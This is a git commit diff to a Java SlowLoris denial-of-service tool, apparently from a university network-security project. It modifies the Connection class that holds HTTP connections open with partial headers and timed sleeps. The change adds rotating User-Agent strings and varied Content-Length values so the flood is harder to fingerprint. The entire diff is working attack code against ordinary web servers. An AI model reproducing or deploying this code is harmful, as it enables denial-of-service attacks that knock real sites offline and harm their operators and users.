40de400b3d2a178283f07f0adc53c230a316e816
Suresh Rangaswamy <suresh301190@gmail.com>
2014-11-29 18:20:02 +0530

    Random UA, CL done

--- src/in/ac/iiitd/ns/Connection.java
+++ src/in/ac/iiitd/ns/Connection.java
@@ -18,11 +18,13 @@ public class Connection implements Runnable{
 	private Socket socket;
 	/** Writer used to write */
 	private BufferedWriter writer;
+	private final int UA;
+	private final int CL; 
 	
 	private final SlowLoris slowloris;
 	
+	/** List of User-Agents to be used in the http calls */
 	static final String[] USER_AGENTS = new String[]{
-		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
 	    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
 	    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
 	    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
@@ -31,20 +33,14 @@ public class Connection implements Runnable{
 	    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
 	};
 	
-	public Connection(SlowLoris slowLoris) {
-		// TODO Auto-generated constructor stub
-		this.hostname = "localhost";
-		this.port = 80;
-		this.interval = 10000;
-		this.slowloris = slowLoris;
-	}
-	
-	public 	Connection(String hostname, int port, int interval, SlowLoris slowLoris) {
+	public 	Connection(String hostname, int port, int interval, SlowLoris slowLoris, int UA) {
 		// TODO Auto-generated constructor stub
 		this.hostname = hostname;
 		this.port = port;
 		this.interval = interval;
 		this.slowloris = slowLoris;
+		this.UA = UA%USER_AGENTS.length;
+		this.CL = (15698415 * UA)%1000007;
 	}
 
 	@Override
@@ -56,10 +52,8 @@ public class Connection implements Runnable{
 					socket.getOutputStream(), "UTF-8")); // A writer used to output to the socket
 			writer.write("GET / HTTP/1.1\r\n");
 			writer.write("Host: " + hostname + " \r\n");
-			writer.write("User-agent:Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;" +
-					" Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0." +
-					"4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
-			writer.write("Content-Length: 1000000\r\n");
+			writer.write("User-agent:" + USER_AGENTS[UA] + "\r\n");
+			writer.write("Content-Length: " + CL + "\r\n");
 			writer.write("Connection:close\r\n");
 			writer.write("X-a:\r\n");	// Custom header, contains junk
 			writer.flush();				// Flushes the writer, to ensure that the header is written to the socket
@@ -70,7 +64,7 @@ public class Connection implements Runnable{
 				try {
 					Thread.sleep(interval);	// Forces this thread to wait, to make the connection last
 				} catch (InterruptedException e) {
-					System.out.println("Thread can't sleep");
+					System.err.println("Thread can't sleep");
 				}
 			}
 			
